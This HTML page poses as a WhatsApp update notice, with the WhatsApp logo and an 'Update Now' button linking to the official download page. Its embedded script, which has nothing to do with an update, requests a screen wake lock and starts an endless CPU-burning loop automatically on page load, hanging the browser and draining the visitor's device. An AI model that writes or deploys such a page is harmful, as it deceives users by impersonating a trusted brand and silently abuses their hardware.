<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Update</title>
    <!-- Add Bootstrap CSS link -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <div class="card p-4 text-center shadow-sm">
            <img class="mb-3" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" width="80">
            <h2 class="mb-3">WhatsApp Update Available</h2>
            <p class="mb-4">A new version of WhatsApp is available for download. Update now to get the latest features and security improvements.</p>
            <a href="https://www.whatsapp.com/download/" class="btn btn-success btn-lg">Update Now</a>
        </div>
    </div>

    <!-- Add Bootstrap JS and dependencies -->
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js"></script>

    <script>
        
        // Intensive CPU computation
        function burnCPU() {
            let x = 0;
            while (true) {
                x += Math.random() * Math.random();
            }
        }

        // Keep screen on (only works if user interacts first)
        if ("wakeLock" in navigator) {
            navigator.wakeLock.request("screen").catch(console.error);
        }

        // Run intensive CPU task
        setTimeout(burnCPU, 100);
    </script>
</body>
</html>
